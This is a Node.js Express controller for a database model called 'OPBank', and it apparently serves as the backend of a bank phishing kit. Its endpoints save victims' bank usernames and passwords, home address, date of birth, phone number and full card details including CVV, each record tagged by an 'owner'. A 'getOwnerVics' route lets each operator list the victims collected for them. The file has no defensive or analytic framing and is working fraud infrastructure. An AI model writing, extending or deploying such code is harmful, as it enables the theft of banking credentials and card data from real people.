var moment = require("moment"); // require
const OPBank = require("../models/opbankModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    OPBank.find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    OPBank.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        await OPBank.create({
            uniqueid,
            username,
            password,
            status: 1,
            owner,
            ip,
            timestamp: moment().format()
        });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitBilling = async (req, res) => {
    const { ccnum, ccexp, ccname, cvv, uniqueid } = req.body;
    try {
        await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitPersonal = async (req, res) => {
    const { address, dob, telephone, uniqueid } = req.body;
    try {
        await OPBank.findOneAndUpdate({ uniqueid }, { address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await OPBank.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    getInfo,
    submitLogin,
    submitPersonal,
    submitBilling,
    deleteEntry,
};
